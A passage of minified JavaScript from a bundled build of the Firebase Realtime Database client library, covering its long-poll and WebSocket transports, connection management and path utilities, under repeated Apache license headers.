 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class nT{constructor(e,n,r,i,s=!1,o="",a=!1,c=!1,u=null){this.secure=n,this.namespace=r,this.webSocketOnly=i,this.nodeAdmin=s,this.persistenceKey=o,this.includeNamespaceInQueryParams=a,this.isUsingEmulator=c,this.emulatorOptions=u,this._host=e.toLowerCase(),this._domain=this._host.substr(this._host.indexOf(".")+1),this.internalHost=hs.get("host:"+e)||this._host}isCacheableHost(){return this.internalHost.substr(0,2)==="s-"}isCustomHost(){return this._domain!=="firebaseio.com"&&this._domain!=="firebaseio-demo.com"}get host(){return this._host}set host(e){e!==this.internalHost&&(this.internalHost=e,this.isCacheableHost()&&hs.set("host:"+this._host,this.internalHost))}toString(){let e=this.toURLString();return this.persistenceKey&&(e+="<"+this.persistenceKey+">"),e}toURLString(){const e=this.secure?"https://":"http://",n=this.includeNamespaceInQueryParams?`?ns=${this.namespace}`:"";return`${e}${this.host}/${n}`}}function QF(t){return t.host!==t.internalHost||t.isCustomHost()||t.includeNamespaceInQueryParams}function rT(t,e,n){B(typeof e=="string","typeof type must == string"),B(typeof n=="object","typeof params must == object");let r;if(e===eT)r=(t.secure?"wss://":"ws://")+t.internalHost+"/.ws?";else if(e===tT)r=(t.secure?"https://":"http://")+t.internalHost+"/.lp?";else throw new Error("Unknown connection type: "+e);QF(t)&&(n.ns=t.namespace);const i=[];return ht(n,(s,o)=>{i.push(s+"="+o)}),r+i.join("&")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class XF{constructor(){this.counters_={}}incrementCounter(e,n=1){or(this.counters_,e)||(this.counters_[e]=0),this.counters_[e]+=n}get(){return KD(this.counters_)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const lp={},cp={};function Hv(t){const e=t.toString();return lp[e]||(lp[e]=new XF),lp[e]}function JF(t,e){const n=t.toString();return cp[n]||(cp[n]=e()),cp[n]}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ZF{constructor(e){this.onMessage_=e,this.pendingResponses=[],this.currentResponseNum=0,this.closeAfterResponse=-1,this.onClose=null}closeAfter(e,n){this.closeAfterResponse=e,this.onClose=n,this.closeAfterResponse<this.currentResponseNum&&(this.onClose(),this.onClose=null)}handleResponse(e,n){for(this.pendingResponses[e]=n;this.pendingResponses[this.currentResponseNum];){const r=this.pendingResponses[this.currentResponseNum];delete this.pendingResponses[this.currentResponseNum];for(let i=0;i<r.length;++i)r[i]&&sa(()=>{this.onMessage_(r[i])});if(this.currentResponseNum===this.closeAfterResponse){this.onClose&&(this.onClose(),this.onClose=null);break}this.currentResponseNum++}}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const fx="start",e3="close",t3="pLPCommand",n3="pRTLPCB",iT="id",sT="pw",oT="ser",r3="cb",i3="seg",s3="ts",o3="d",a3="dframe",aT=1870,lT=30,l3=aT-lT,c3=25e3,u3=3e4;class oo{constructor(e,n,r,i,s,o,a){this.connId=e,this.repoInfo=n,this.applicationId=r,this.appCheckToken=i,this.authToken=s,this.transportSessionId=o,this.lastSessionId=a,this.bytesSent=0,this.bytesReceived=0,this.everConnected_=!1,this.log_=xc(e),this.stats_=Hv(n),this.urlFn=c=>(this.appCheckToken&&(c[Hm]=this.appCheckToken),rT(n,tT,c))}open(e,n){this.curSegmentNum=0,this.onDisconnect_=n,this.myPacketOrderer=new ZF(e),this.isClosed_=!1,this.connectTimeoutTimer_=setTimeout(()=>{this.log_("Timed out trying to connect."),this.onClosed_(),this.connectTimeoutTimer_=null},Math.floor(u3)),UF(()=>{if(this.isClosed_)return;this.scriptTagHolder=new Wv((...s)=>{const[o,a,c,u,p]=s;if(this.incrementIncomingBytes_(s),!!this.scriptTagHolder)if(this.connectTimeoutTimer_&&(clearTimeout(this.connectTimeoutTimer_),this.connectTimeoutTimer_=null),this.everConnected_=!0,o===fx)this.id=a,this.password=c;else if(o===e3)a?(this.scriptTagHolder.sendNewPolls=!1,this.myPacketOrderer.closeAfter(a,()=>{this.onClosed_()})):this.onClosed_();else throw new Error("Unrecognized command received: "+o)},(...s)=>{const[o,a]=s;this.incrementIncomingBytes_(s),this.myPacketOrderer.handleResponse(o,a)},()=>{this.onClosed_()},this.urlFn);const r={};r[fx]="t",r[oT]=Math.floor(Math.random()*1e8),this.scriptTagHolder.uniqueCallbackIdentifier&&(r[r3]=this.scriptTagHolder.uniqueCallbackIdentifier),r[Gb]=Vv,this.transportSessionId&&(r[qb]=this.transportSessionId),this.lastSessionId&&(r[Jb]=this.lastSessionId),this.applicationId&&(r[Zb]=this.applicationId),this.appCheckToken&&(r[Hm]=this.appCheckToken),typeof location<"u"&&location.hostname&&Xb.test(location.hostname)&&(r[Yb]=Qb);const i=this.urlFn(r);this.log_("Connecting via long-poll to "+i),this.scriptTagHolder.addTag(i,()=>{})})}start(){this.scriptTagHolder.startLongPoll(this.id,this.password),this.addDisconnectPingFrame(this.id,this.password)}static forceAllow(){oo.forceAllow_=!0}static forceDisallow(){oo.forceDisallow_=!0}static isAvailable(){return oo.forceAllow_?!0:!oo.forceDisallow_&&typeof document<"u"&&document.createElement!=null&&!zF()&&!BF()}markConnectionHealthy(){}shutdown_(){this.isClosed_=!0,this.scriptTagHolder&&(this.scriptTagHolder.close(),this.scriptTagHolder=null),this.myDisconnFrame&&(document.body.removeChild(this.myDisconnFrame),this.myDisconnFrame=null),this.connectTimeoutTimer_&&(clearTimeout(this.connectTimeoutTimer_),this.connectTimeoutTimer_=null)}onClosed_(){this.isClosed_||(this.log_("Longpoll is closing itself"),this.shutdown_(),this.onDisconnect_&&(this.onDisconnect_(this.everConnected_),this.onDisconnect_=null))}close(){this.isClosed_||(this.log_("Longpoll is being closed."),this.shutdown_())}send(e){const n=tt(e);this.bytesSent+=n.length,this.stats_.incrementCounter("bytes_sent",n.length);const r=z1(n),i=Wb(r,l3);for(let s=0;s<i.length;s++)this.scriptTagHolder.enqueueSegment(this.curSegmentNum,i.length,i[s]),this.curSegmentNum++}addDisconnectPingFrame(e,n){this.myDisconnFrame=document.createElement("iframe");const r={};r[a3]="t",r[iT]=e,r[sT]=n,this.myDisconnFrame.src=this.urlFn(r),this.myDisconnFrame.style.display="none",document.body.appendChild(this.myDisconnFrame)}incrementIncomingBytes_(e){const n=tt(e).length;this.bytesReceived+=n,this.stats_.incrementCounter("bytes_received",n)}}class Wv{constructor(e,n,r,i){this.onDisconnect=r,this.urlFn=i,this.outstandingRequests=new Set,this.pendingSegs=[],this.currentSerial=Math.floor(Math.random()*1e8),this.sendNewPolls=!0;{this.uniqueCallbackIdentifier=MF(),window[t3+this.uniqueCallbackIdentifier]=e,window[n3+this.uniqueCallbackIdentifier]=n,this.myIFrame=Wv.createIFrame_();let s="";this.myIFrame.src&&this.myIFrame.src.substr(0,11)==="javascript:"&&(s='<script>document.domain="'+document.domain+'";<\/script>');const o="<html><body>"+s+"</body></html>";try{this.myIFrame.doc.open(),this.myIFrame.doc.write(o),this.myIFrame.doc.close()}catch(a){ct("frame writing exception"),a.stack&&ct(a.stack),ct(a)}}}static createIFrame_(){const e=document.createElement("iframe");if(e.style.display="none",document.body){document.body.appendChild(e);try{e.contentWindow.document||ct("No IE domain setting required")}catch{const r=document.domain;e.src="javascript:void((function(){document.open();document.domain='"+r+"';document.close();})())"}}else throw"Document body has not initialized. Wait to initialize Firebase until after the document is ready.";return e.contentDocument?e.doc=e.contentDocument:e.contentWindow?e.doc=e.contentWindow.document:e.document&&(e.doc=e.document),e}close(){this.alive=!1,this.myIFrame&&(this.myIFrame.doc.body.textContent="",setTimeout(()=>{this.myIFrame!==null&&(document.body.removeChild(this.myIFrame),this.myIFrame=null)},Math.floor(0)));const e=this.onDisconnect;e&&(this.onDisconnect=null,e())}startLongPoll(e,n){for(this.myID=e,this.myPW=n,this.alive=!0;this.newRequest_(););}newRequest_(){if(this.alive&&this.sendNewPolls&&this.outstandingRequests.size<(this.pendingSegs.length>0?2:1)){this.currentSerial++;const e={};e[iT]=this.myID,e[sT]=this.myPW,e[oT]=this.currentSerial;let n=this.urlFn(e),r="",i=0;for(;this.pendingSegs.length>0&&this.pendingSegs[0].d.length+lT+r.length<=aT;){const o=this.pendingSegs.shift();r=r+"&"+i3+i+"="+o.seg+"&"+s3+i+"="+o.ts+"&"+o3+i+"="+o.d,i++}return n=n+r,this.addLongPollTag_(n,this.currentSerial),!0}else return!1}enqueueSegment(e,n,r){this.pendingSegs.push({seg:e,ts:n,d:r}),this.alive&&this.newRequest_()}addLongPollTag_(e,n){this.outstandingRequests.add(n);const r=()=>{this.outstandingRequests.delete(n),this.newRequest_()},i=setTimeout(r,Math.floor(c3)),s=()=>{clearTimeout(i),r()};this.addTag(e,s)}addTag(e,n){setTimeout(()=>{try{if(!this.sendNewPolls)return;const r=this.myIFrame.doc.createElement("script");r.type="text/javascript",r.async=!0,r.src=e,r.onload=r.onreadystatechange=function(){const i=r.readyState;(!i||i==="loaded"||i==="complete")&&(r.onload=r.onreadystatechange=null,r.parentNode&&r.parentNode.removeChild(r),n())},r.onerror=()=>{ct("Long-poll script failed to load: "+e),this.sendNewPolls=!1,this.close()},this.myIFrame.doc.body.appendChild(r)}catch{}},Math.floor(1))}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const d3=16384,h3=45e3;let jd=null;typeof MozWebSocket<"u"?jd=MozWebSocket:typeof WebSocket<"u"&&(jd=WebSocket);class Nn{constructor(e,n,r,i,s,o,a){this.connId=e,this.applicationId=r,this.appCheckToken=i,this.authToken=s,this.keepaliveTimer=null,this.frames=null,this.totalFrames=0,this.bytesSent=0,this.bytesReceived=0,this.log_=xc(this.connId),this.stats_=Hv(n),this.connURL=Nn.connectionURL_(n,o,a,i,r),this.nodeAdmin=n.nodeAdmin}static connectionURL_(e,n,r,i,s){const o={};return o[Gb]=Vv,typeof location<"u"&&location.hostname&&Xb.test(location.hostname)&&(o[Yb]=Qb),n&&(o[qb]=n),r&&(o[Jb]=r),i&&(o[Hm]=i),s&&(o[Zb]=s),rT(e,eT,o)}open(e,n){this.onDisconnect=n,this.onMessage=e,this.log_("Websocket connecting to "+this.connURL),this.everConnected_=!1,hs.set("previous_websocket_failure",!0);try{let r;G1(),this.mySock=new jd(this.connURL,[],r)}catch(r){this.log_("Error instantiating WebSocket.");const i=r.message||r.data;i&&this.log_(i),this.onClosed_();return}this.mySock.onopen=()=>{this.log_("Websocket connected."),this.everConnected_=!0},this.mySock.onclose=()=>{this.log_("Websocket connection was disconnected."),this.mySock=null,this.onClosed_()},this.mySock.onmessage=r=>{this.handleIncomingFrame(r)},this.mySock.onerror=r=>{this.log_("WebSocket error.  Closing connection.");const i=r.message||r.data;i&&this.log_(i),this.onClosed_()}}start(){}static forceDisallow(){Nn.forceDisallow_=!0}static isAvailable(){let e=!1;if(typeof navigator<"u"&&navigator.userAgent){const n=/Android ([0-9]{0,}\.[0-9]{0,})/,r=navigator.userAgent.match(n);r&&r.length>1&&parseFloat(r[1])<4.4&&(e=!0)}return!e&&jd!==null&&!Nn.forceDisallow_}static previouslyFailed(){return hs.isInMemoryStorage||hs.get("previous_websocket_failure")===!0}markConnectionHealthy(){hs.remove("previous_websocket_failure")}appendFrame_(e){if(this.frames.push(e),this.frames.length===this.totalFrames){const n=this.frames.join("");this.frames=null;const r=Ul(n);this.onMessage(r)}}handleNewFrameCount_(e){this.totalFrames=e,this.frames=[]}extractFrameCount_(e){if(B(this.frames===null,"We already have a frame buffer"),e.length<=6){const n=Number(e);if(!isNaN(n))return this.handleNewFrameCount_(n),null}return this.handleNewFrameCount_(1),e}handleIncomingFrame(e){if(this.mySock===null)return;const n=e.data;if(this.bytesReceived+=n.length,this.stats_.incrementCounter("bytes_received",n.length),this.resetKeepAlive(),this.frames!==null)this.appendFrame_(n);else{const r=this.extractFrameCount_(n);r!==null&&this.appendFrame_(r)}}send(e){this.resetKeepAlive();const n=tt(e);this.bytesSent+=n.length,this.stats_.incrementCounter("bytes_sent",n.length);const r=Wb(n,d3);r.length>1&&this.sendString_(String(r.length));for(let i=0;i<r.length;i++)this.sendString_(r[i])}shutdown_(){this.isClosed_=!0,this.keepaliveTimer&&(clearInterval(this.keepaliveTimer),this.keepaliveTimer=null),this.mySock&&(this.mySock.close(),this.mySock=null)}onClosed_(){this.isClosed_||(this.log_("WebSocket is closing itself"),this.shutdown_(),this.onDisconnect&&(this.onDisconnect(this.everConnected_),this.onDisconnect=null))}close(){this.isClosed_||(this.log_("WebSocket is being closed"),this.shutdown_())}resetKeepAlive(){clearInterval(this.keepaliveTimer),this.keepaliveTimer=setInterval(()=>{this.mySock&&this.sendString_("0"),this.resetKeepAlive()},Math.floor(h3))}sendString_(e){try{this.mySock.send(e)}catch(n){this.log_("Exception thrown from WebSocket.send():",n.message||n.data,"Closing connection."),setTimeout(this.onClosed_.bind(this),0)}}}Nn.responsesRequiredToBeHealthy=2;Nn.healthyTimeout=3e4;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Vl{static get ALL_TRANSPORTS(){return[oo,Nn]}static get IS_TRANSPORT_INITIALIZED(){return this.globalTransportInitialized_}constructor(e){this.initTransports_(e)}initTransports_(e){const n=Nn&&Nn.isAvailable();let r=n&&!Nn.previouslyFailed();if(e.webSocketOnly&&(n||At("wss:// URL used, but browser isn't known to support websockets.  Trying anyway."),r=!0),r)this.transports_=[Nn];else{const i=this.transports_=[];for(const s of Vl.ALL_TRANSPORTS)s&&s.isAvailable()&&i.push(s);Vl.globalTransportInitialized_=!0}}initialTransport(){if(this.transports_.length>0)return this.transports_[0];throw new Error("No transports available")}upgradeTransport(){return this.transports_.length>1?this.transports_[1]:null}}Vl.globalTransportInitialized_=!1;/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const f3=6e4,p3=5e3,m3=10*1024,g3=100*1024,up="t",px="d",v3="s",mx="r",y3="e",gx="o",vx="a",yx="n",_x="p",_3="h";class w3{constructor(e,n,r,i,s,o,a,c,u,p){this.id=e,this.repoInfo_=n,this.applicationId_=r,this.appCheckToken_=i,this.authToken_=s,this.onMessage_=o,this.onReady_=a,this.onDisconnect_=c,this.onKill_=u,this.lastSessionId=p,this.connectionCount=0,this.pendingDataMessages=[],this.state_=0,this.log_=xc("c:"+this.id+":"),this.transportManager_=new Vl(n),this.log_("Connection created"),this.start_()}start_(){const e=this.transportManager_.initialTransport();this.conn_=new e(this.nextTransportId_(),this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,null,this.lastSessionId),this.primaryResponsesRequired_=e.responsesRequiredToBeHealthy||0;const n=this.connReceiver_(this.conn_),r=this.disconnReceiver_(this.conn_);this.tx_=this.conn_,this.rx_=this.conn_,this.secondaryConn_=null,this.isHealthy_=!1,setTimeout(()=>{this.conn_&&this.conn_.open(n,r)},Math.floor(0));const i=e.healthyTimeout||0;i>0&&(this.healthyTimeout_=hl(()=>{this.healthyTimeout_=null,this.isHealthy_||(this.conn_&&this.conn_.bytesReceived>g3?(this.log_("Connection exceeded healthy timeout but has received "+this.conn_.bytesReceived+" bytes.  Marking connection healthy."),this.isHealthy_=!0,this.conn_.markConnectionHealthy()):this.conn_&&this.conn_.bytesSent>m3?this.log_("Connection exceeded healthy timeout but has sent "+this.conn_.bytesSent+" bytes.  Leaving connection alive."):(this.log_("Closing unhealthy connection after timeout."),this.close()))},Math.floor(i)))}nextTransportId_(){return"c:"+this.id+":"+this.connectionCount++}disconnReceiver_(e){return n=>{e===this.conn_?this.onConnectionLost_(n):e===this.secondaryConn_?(this.log_("Secondary connection lost."),this.onSecondaryConnectionLost_()):this.log_("closing an old connection")}}connReceiver_(e){return n=>{this.state_!==2&&(e===this.rx_?this.onPrimaryMessageReceived_(n):e===this.secondaryConn_?this.onSecondaryMessageReceived_(n):this.log_("message on old connection"))}}sendRequest(e){const n={t:"d",d:e};this.sendData_(n)}tryCleanupConnection(){this.tx_===this.secondaryConn_&&this.rx_===this.secondaryConn_&&(this.log_("cleaning up and promoting a connection: "+this.secondaryConn_.connId),this.conn_=this.secondaryConn_,this.secondaryConn_=null)}onSecondaryControl_(e){if(up in e){const n=e[up];n===vx?this.upgradeIfSecondaryHealthy_():n===mx?(this.log_("Got a reset on secondary, closing it"),this.secondaryConn_.close(),(this.tx_===this.secondaryConn_||this.rx_===this.secondaryConn_)&&this.close()):n===gx&&(this.log_("got pong on secondary."),this.secondaryResponsesRequired_--,this.upgradeIfSecondaryHealthy_())}}onSecondaryMessageReceived_(e){const n=Ba("t",e),r=Ba("d",e);if(n==="c")this.onSecondaryControl_(r);else if(n==="d")this.pendingDataMessages.push(r);else throw new Error("Unknown protocol layer: "+n)}upgradeIfSecondaryHealthy_(){this.secondaryResponsesRequired_<=0?(this.log_("Secondary connection is healthy."),this.isHealthy_=!0,this.secondaryConn_.markConnectionHealthy(),this.proceedWithUpgrade_()):(this.log_("sending ping on secondary."),this.secondaryConn_.send({t:"c",d:{t:_x,d:{}}}))}proceedWithUpgrade_(){this.secondaryConn_.start(),this.log_("sending client ack on secondary"),this.secondaryConn_.send({t:"c",d:{t:vx,d:{}}}),this.log_("Ending transmission on primary"),this.conn_.send({t:"c",d:{t:yx,d:{}}}),this.tx_=this.secondaryConn_,this.tryCleanupConnection()}onPrimaryMessageReceived_(e){const n=Ba("t",e),r=Ba("d",e);n==="c"?this.onControl_(r):n==="d"&&this.onDataMessage_(r)}onDataMessage_(e){this.onPrimaryResponse_(),this.onMessage_(e)}onPrimaryResponse_(){this.isHealthy_||(this.primaryResponsesRequired_--,this.primaryResponsesRequired_<=0&&(this.log_("Primary connection is healthy."),this.isHealthy_=!0,this.conn_.markConnectionHealthy()))}onControl_(e){const n=Ba(up,e);if(px in e){const r=e[px];if(n===_3){const i=Object.assign({},r);this.repoInfo_.isUsingEmulator&&(i.h=this.repoInfo_.host),this.onHandshake_(i)}else if(n===yx){this.log_("recvd end transmission on primary"),this.rx_=this.secondaryConn_;for(let i=0;i<this.pendingDataMessages.length;++i)this.onDataMessage_(this.pendingDataMessages[i]);this.pendingDataMessages=[],this.tryCleanupConnection()}else n===v3?this.onConnectionShutdown_(r):n===mx?this.onReset_(r):n===y3?Vm("Server Error: "+r):n===gx?(this.log_("got pong on primary."),this.onPrimaryResponse_(),this.sendPingOnPrimaryIfNecessary_()):Vm("Unknown control packet command: "+n)}}onHandshake_(e){const n=e.ts,r=e.v,i=e.h;this.sessionId=e.s,this.repoInfo_.host=i,this.state_===0&&(this.conn_.start(),this.onConnectionEstablished_(this.conn_,n),Vv!==r&&At("Protocol version mismatch detected"),this.tryStartUpgrade_())}tryStartUpgrade_(){const e=this.transportManager_.upgradeTransport();e&&this.startUpgrade_(e)}startUpgrade_(e){this.secondaryConn_=new e(this.nextTransportId_(),this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,this.sessionId),this.secondaryResponsesRequired_=e.responsesRequiredToBeHealthy||0;const n=this.connReceiver_(this.secondaryConn_),r=this.disconnReceiver_(this.secondaryConn_);this.secondaryConn_.open(n,r),hl(()=>{this.secondaryConn_&&(this.log_("Timed out trying to upgrade."),this.secondaryConn_.close())},Math.floor(f3))}onReset_(e){this.log_("Reset packet received.  New host: "+e),this.repoInfo_.host=e,this.state_===1?this.close():(this.closeConnections_(),this.start_())}onConnectionEstablished_(e,n){this.log_("Realtime connection established."),this.conn_=e,this.state_=1,this.onReady_&&(this.onReady_(n,this.sessionId),this.onReady_=null),this.primaryResponsesRequired_===0?(this.log_("Primary connection is healthy."),this.isHealthy_=!0):hl(()=>{this.sendPingOnPrimaryIfNecessary_()},Math.floor(p3))}sendPingOnPrimaryIfNecessary_(){!this.isHealthy_&&this.state_===1&&(this.log_("sending ping on primary."),this.sendData_({t:"c",d:{t:_x,d:{}}}))}onSecondaryConnectionLost_(){const e=this.secondaryConn_;this.secondaryConn_=null,(this.tx_===e||this.rx_===e)&&this.close()}onConnectionLost_(e){this.conn_=null,!e&&this.state_===0?(this.log_("Realtime connection failed."),this.repoInfo_.isCacheableHost()&&(hs.remove("host:"+this.repoInfo_.host),this.repoInfo_.internalHost=this.repoInfo_.host)):this.state_===1&&this.log_("Realtime connection lost."),this.close()}onConnectionShutdown_(e){this.log_("Connection shutdown command received. Shutting down..."),this.onKill_&&(this.onKill_(e),this.onKill_=null),this.onDisconnect_=null,this.close()}sendData_(e){if(this.state_!==1)throw"Connection is not connected";this.tx_.send(e)}close(){this.state_!==2&&(this.log_("Closing realtime connection."),this.state_=2,this.closeConnections_(),this.onDisconnect_&&(this.onDisconnect_(),this.onDisconnect_=null))}closeConnections_(){this.log_("Shutting down all connections"),this.conn_&&(this.conn_.close(),this.conn_=null),this.secondaryConn_&&(this.secondaryConn_.close(),this.secondaryConn_=null),this.healthyTimeout_&&(clearTimeout(this.healthyTimeout_),this.healthyTimeout_=null)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class cT{put(e,n,r,i){}merge(e,n,r,i){}refreshAuthToken(e){}refreshAppCheckToken(e){}onDisconnectPut(e,n,r){}onDisconnectMerge(e,n,r){}onDisconnectCancel(e,n){}reportStats(e){}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class uT{constructor(e){this.allowedEvents_=e,this.listeners_={},B(Array.isArray(e)&&e.length>0,"Requires a non-empty array")}trigger(e,...n){if(Array.isArray(this.listeners_[e])){const r=[...this.listeners_[e]];for(let i=0;i<r.length;i++)r[i].callback.apply(r[i].context,n)}}on(e,n,r){this.validateEventType_(e),this.listeners_[e]=this.listeners_[e]||[],this.listeners_[e].push({callback:n,context:r});const i=this.getInitialEvent(e);i&&n.apply(r,i)}off(e,n,r){this.validateEventType_(e);const i=this.listeners_[e]||[];for(let s=0;s<i.length;s++)if(i[s].callback===n&&(!r||r===i[s].context)){i.splice(s,1);return}}validateEventType_(e){B(this.allowedEvents_.find(n=>n===e),"Unknown event: "+e)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Md extends uT{static getInstance(){return new Md}constructor(){super(["online"]),this.online_=!0,typeof window<"u"&&typeof window.addEventListener<"u"&&!Nv()&&(window.addEventListener("online",()=>{this.online_||(this.online_=!0,this.trigger("online",!0))},!1),window.addEventListener("offline",()=>{this.online_&&(this.online_=!1,this.trigger("online",!1))},!1))}getInitialEvent(e){return B(e==="online","Unknown event type: "+e),[this.online_]}currentlyOnline(){return this.online_}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const wx=32,xx=768;class Se{constructor(e,n){if(n===void 0){this.pieces_=e.split("/");let r=0;for(let i=0;i<this.pieces_.length;i++)this.pieces_[i].length>0&&(this.pieces_[r]=this.pieces_[i],r++);this.pieces_.length=r,this.pieceNum_=0}else this.pieces_=e,this.pieceNum_=n}toString(){let e="";for(let n=this.pieceNum_;n<this.pieces_.length;n++)this.pieces_[n]!==""&&(e+="/"+this.pieces_[n]);return e||"/"}}function ve(){return new Se("")}function ae(t){return t.pieceNum_>=t.pieces_.length?null:t.pieces_[t.pieceNum_]}function Fi(t){return t.pieces_.length-t.pieceNum_}function ke(t){let e=t.pieceNum_;return e<t.pieces_.length&&e++,new Se(t.pieces_,e)}function Kv(t){return t.pieceNum_<t.pieces_.length?t.pieces_[t.pieces_.length-1]:null}function x3(t){let e="";for(let n=t.pieceNum_;n<t.pieces_.length;n++)t.pieces_[n]!==""&&(e+="/"+encodeURIComponent(String(t.pieces_[n])));return e||"/"}function Hl(t,e=0){return t.pieces_.slice(t.pieceNum_+e)}function dT(t){if(t.pieceNum_>=t.pieces_.length)return null;const e=[];for(let n=t.pieceNum_;n<t.pieces_.length-1;n++)e.push(t.pieces_[n]);return new Se(e,0)}function Ve(t,e){const n=[];for(let r=t.pieceNum_;r<t.pieces_.length;r++)n.push(t.pieces_[r]);if(e instanceof Se)for(let r=e.pieceNum_;r<e.pieces_.length;r++)n.push(e.pieces_[r]);else{const r=e.split("/");for(let i=0;i<r.length;i++)r[i].length>0&&n.push(r[i])}return new Se(n,0)}function ce(t){return t.pieceNum_>=t.pieces_.length}function Pt(t,e){const n=ae(t),r=ae(e);if(n===null)return e;if(n===r)return Pt(ke(t),ke(e));throw new Error("INTERNAL ERROR: innerPath ("+e+") is not within outerPath ("+t+")")}function E3(t,e){const n=Hl(t,0),r=Hl(e,0);for(let i=0;i<n.length&&i<r.length;i++){const s=Ms(n[i],r[i]);if(s!==0)return s}return n.length===r.length?0:n.length<r.length?-1:1}function Gv(t,e){if(Fi(t)!==Fi(e))return!1;for(let n=t.pieceNum_,r=e.pieceNum_;n<=t.pieces_.length;n++,r++)if(t.pieces_[n]!==e.pieces_[r])return!1;return!0}function fn(t,e){let n=t.pieceNum_,r=e.pieceNum_;if(Fi(t)>Fi(e))return!1;for(;n<t.pieces_.length;){if(t.pieces_[n]!==e.pieces_[r])return!1;++n,++r}return!0}class C3{constructor(e,n){this.errorPrefix_=n,this.parts_=Hl(e,0),this.byteLength_=Math.max(1,this.parts_.length);for(let r=0;r<this.parts_.length;r++)this.byteLength_+=Sh(this.parts_[r]);hT(this)}}function 